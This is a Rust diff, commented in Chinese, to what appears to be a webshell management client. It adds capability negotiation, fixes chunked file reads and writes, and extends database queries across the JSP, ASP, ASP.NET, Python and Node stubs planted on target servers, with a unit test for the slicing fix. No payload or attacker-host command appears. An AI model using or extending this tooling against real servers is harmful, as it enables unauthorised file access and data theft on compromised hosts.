@@ -9,7 +9,7 @@ use url::Url;
 
 use dosword_sdk::domain::{
     AppSettings, CommandOutput, DbConnection, DbProbeResult, DbQueryResult, DirListing,
-    ProbeResult, ShellProfile,
+    ProbeResult, ShellProfile, TargetCapabilities,
 };
 use dosword_sdk::encoder::{NativeEncoder, PayloadEncoder, md5_hex};
 
@@ -152,6 +152,23 @@ fn form_call(
 }
 
 /// 缓存环境信息（current_dir / separator），供文件操作。
+/// 兼容两类 stub 的分块读取语义：
+/// - 支持 seek 的 stub 已按 `o`/`l` 返回分块（长度 ≤ length）→ 原样使用；
+/// - 不支持 seek 的 stub 忽略参数、返回整文件（长度 > length）→ 按 offset 切片。
+///
+/// 旧实现无条件二次切片，导致 offset > 0 时 `offset >= total` 直接读空。
+fn slice_chunk(bytes: Vec<u8>, offset: u64, length: u64) -> Vec<u8> {
+    let total = bytes.len() as u64;
+    if total <= length {
+        return bytes;
+    }
+    if offset >= total {
+        return Vec::new();
+    }
+    let end = (offset + length).min(total);
+    bytes[offset as usize..end as usize].to_vec()
+}
+
 fn ensure_info(session: &JspSession, settings: &AppSettings) -> Result<ProbeResult, ProtocolError> {
     if let Ok(guard) = session.info.lock()
         && let Some(info) = guard.as_ref()
@@ -160,6 +177,18 @@ fn ensure_info(session: &JspSession, settings: &AppSettings) -> Result<ProbeResu
         return Ok(info.clone());
     }
     let value = form_call(session, "probe", &[], settings)?;
+    // stub 上报的 info（能力协商）：键值均为字符串
+    let mut info_map = std::collections::HashMap::new();
+    if let Some(object) = value.pointer("/data/info").and_then(|v| v.as_object()) {
+        for (key, item) in object {
+            let text = item
+                .as_str()
+                .map(str::to_string)
+                .unwrap_or_else(|| item.to_string());
+            info_map.insert(key.clone(), text);
+        }
+    }
+    let capabilities = TargetCapabilities::from_info(&info_map);
     let info = ProbeResult {
         status: "online".to_string(),
         server: value
@@ -188,13 +217,12 @@ fn ensure_info(session: &JspSession, settings: &AppSettings) -> Result<ProbeResu
             .unwrap_or("/")
             .to_string(),
         message: "JSP/ASP 协议探测成功".to_string(),
-
         php_sapi: "".to_string(),
         arch: "".to_string(),
         extensions: vec![],
         disable_functions: "".to_string(),
-        capabilities: None,
-        info: std::collections::HashMap::new(),
+        capabilities,
+        info: info_map,
     };
     if let Ok(mut slot) = session.info.lock() {
         *slot = Some(info.clone());
@@ -390,15 +418,7 @@ impl Protocol for JvmLikeProtocol {
         let bytes = base64::engine::general_purpose::STANDARD
             .decode(data)
             .map_err(|_| ProtocolError::ParseError("文件内容 Base64 解码失败".to_string()))?;
-        // 兼容不支持 seek 的 stub：返回整文件时按 offset/length 切片
-        let total = bytes.len() as u64;
-        if offset >= total {
-            Ok(Vec::new())
-        } else if total > offset + length {
-            Ok(bytes[offset as usize..(offset + length) as usize].to_vec())
-        } else {
-            Ok(bytes[offset as usize..].to_vec())
-        }
+        Ok(slice_chunk(bytes, offset, length))
     }
 
     /// P1：分块写入（stub 支持 seek 时按 offset 定位覆盖写；否则整文件读改写）。
@@ -692,6 +712,63 @@ impl Protocol for JspProtocol {
         }
         .create_dir(session, path, settings)
     }
+
+    fn read_chunk(
+        &self,
+        session: &dyn SessionState,
+        path: &str,
+        offset: u64,
+        length: u64,
+        settings: &AppSettings,
+    ) -> Result<Vec<u8>, ProtocolError> {
+        JvmLikeProtocol {
+            id: "builtin.jsp.v1",
+            display_name: "",
+        }
+        .read_chunk(session, path, offset, length, settings)
+    }
+
+    fn write_chunk(
+        &self,
+        session: &dyn SessionState,
+        path: &str,
+        content: &[u8],
+        offset: u64,
+        settings: &AppSettings,
+    ) -> Result<(), ProtocolError> {
+        JvmLikeProtocol {
+            id: "builtin.jsp.v1",
+            display_name: "",
+        }
+        .write_chunk(session, path, content, offset, settings)
+    }
+
+    fn db_probe(
+        &self,
+        session: &dyn SessionState,
+        connection: &DbConnection,
+        settings: &AppSettings,
+    ) -> Result<DbProbeResult, ProtocolError> {
+        JvmLikeProtocol {
+            id: "builtin.jsp.v1",
+            display_name: "",
+        }
+        .db_probe(session, connection, settings)
+    }
+
+    fn db_query(
+        &self,
+        session: &dyn SessionState,
+        connection: &DbConnection,
+        sql: &str,
+        settings: &AppSettings,
+    ) -> Result<DbQueryResult, ProtocolError> {
+        JvmLikeProtocol {
+            id: "builtin.jsp.v1",
+            display_name: "",
+        }
+        .db_query(session, connection, sql, settings)
+    }
 }
 
 /// ASP.NET 协议（builtin.aspnet.v1）。
@@ -826,6 +903,36 @@ impl Protocol for AspNetProtocol {
         }
         .create_dir(session, path, settings)
     }
+
+    fn read_chunk(
+        &self,
+        session: &dyn SessionState,
+        path: &str,
+        offset: u64,
+        length: u64,
+        settings: &AppSettings,
+    ) -> Result<Vec<u8>, ProtocolError> {
+        JvmLikeProtocol {
+            id: "builtin.aspnet.v1",
+            display_name: "",
+        }
+        .read_chunk(session, path, offset, length, settings)
+    }
+
+    fn write_chunk(
+        &self,
+        session: &dyn SessionState,
+        path: &str,
+        content: &[u8],
+        offset: u64,
+        settings: &AppSettings,
+    ) -> Result<(), ProtocolError> {
+        JvmLikeProtocol {
+            id: "builtin.aspnet.v1",
+            display_name: "",
+        }
+        .write_chunk(session, path, content, offset, settings)
+    }
 }
 
 /// 经典 ASP 协议（builtin.asp.v1，VBScript stub，XOR 载荷）。
@@ -959,6 +1066,36 @@ impl Protocol for AspProtocol {
             display_name: "",
         }
         .create_dir(session, path, settings)
+    }
+
+    fn read_chunk(
+        &self,
+        session: &dyn SessionState,
+        path: &str,
+        offset: u64,
+        length: u64,
+        settings: &AppSettings,
+    ) -> Result<Vec<u8>, ProtocolError> {
+        JvmLikeProtocol {
+            id: "builtin.asp.v1",
+            display_name: "",
+        }
+        .read_chunk(session, path, offset, length, settings)
+    }
+
+    fn write_chunk(
+        &self,
+        session: &dyn SessionState,
+        path: &str,
+        content: &[u8],
+        offset: u64,
+        settings: &AppSettings,
+    ) -> Result<(), ProtocolError> {
+        JvmLikeProtocol {
+            id: "builtin.asp.v1",
+            display_name: "",
+        }
+        .write_chunk(session, path, content, offset, settings)
     }
 }
 
@@ -1197,6 +1334,36 @@ impl Protocol for PythonProtocol {
         }
         .db_query(session, connection, sql, settings)
     }
+
+    fn read_chunk(
+        &self,
+        session: &dyn SessionState,
+        path: &str,
+        offset: u64,
+        length: u64,
+        settings: &AppSettings,
+    ) -> Result<Vec<u8>, ProtocolError> {
+        JvmLikeProtocol {
+            id: "builtin.python.v1",
+            display_name: "",
+        }
+        .read_chunk(session, path, offset, length, settings)
+    }
+
+    fn write_chunk(
+        &self,
+        session: &dyn SessionState,
+        path: &str,
+        content: &[u8],
+        offset: u64,
+        settings: &AppSettings,
+    ) -> Result<(), ProtocolError> {
+        JvmLikeProtocol {
+            id: "builtin.python.v1",
+            display_name: "",
+        }
+        .write_chunk(session, path, content, offset, settings)
+    }
 }
 
 impl dosword_sdk::ProtocolPlugin for PythonProtocol {
@@ -1384,6 +1551,36 @@ impl Protocol for NodeProtocol {
         }
         .db_query(session, connection, sql, settings)
     }
+
+    fn read_chunk(
+        &self,
+        session: &dyn SessionState,
+        path: &str,
+        offset: u64,
+        length: u64,
+        settings: &AppSettings,
+    ) -> Result<Vec<u8>, ProtocolError> {
+        JvmLikeProtocol {
+            id: "builtin.node.v1",
+            display_name: "",
+        }
+        .read_chunk(session, path, offset, length, settings)
+    }
+
+    fn write_chunk(
+        &self,
+        session: &dyn SessionState,
+        path: &str,
+        content: &[u8],
+        offset: u64,
+        settings: &AppSettings,
+    ) -> Result<(), ProtocolError> {
+        JvmLikeProtocol {
+            id: "builtin.node.v1",
+            display_name: "",
+        }
+        .write_chunk(session, path, content, offset, settings)
+    }
 }
 
 impl dosword_sdk::ProtocolPlugin for NodeProtocol {
@@ -1489,6 +1686,21 @@ HTTPServer(("127.0.0.1", port), Hd).serve_forever()
             created_at: String::new(),
             tags: vec![],
         }
+    }
+
+    #[test]
+    fn chunk_slicing_handles_seek_and_whole_file_stubs() {
+        // 支持 seek 的 stub：返回的就是这一块，不能再切
+        assert_eq!(slice_chunk(b"BBBB".to_vec(), 4, 4), b"BBBB");
+        // 不支持 seek 的 stub：返回整文件，需要按 offset/length 切
+        assert_eq!(slice_chunk(b"AAAABBBBCCCC".to_vec(), 4, 4), b"BBBB");
+        assert_eq!(slice_chunk(b"AAAABBBBCCCC".to_vec(), 8, 4), b"CCCC");
+        // 无法区分时的取舍：返回长度不超过请求长度 → 信任 stub 返回的就是该范围。
+        // 真实下载循环按顺序请求、遇到短块即结束，不会在越界 offset 上请求，
+        // 因此这个退化分支不影响实际使用。
+        assert_eq!(slice_chunk(b"AAAA".to_vec(), 8, 4), b"AAAA");
+        // 文件小于请求长度且 offset 为 0：整文件即结果
+        assert_eq!(slice_chunk(b"AAA".to_vec(), 0, 4), b"AAA");
     }
 
     #[test]
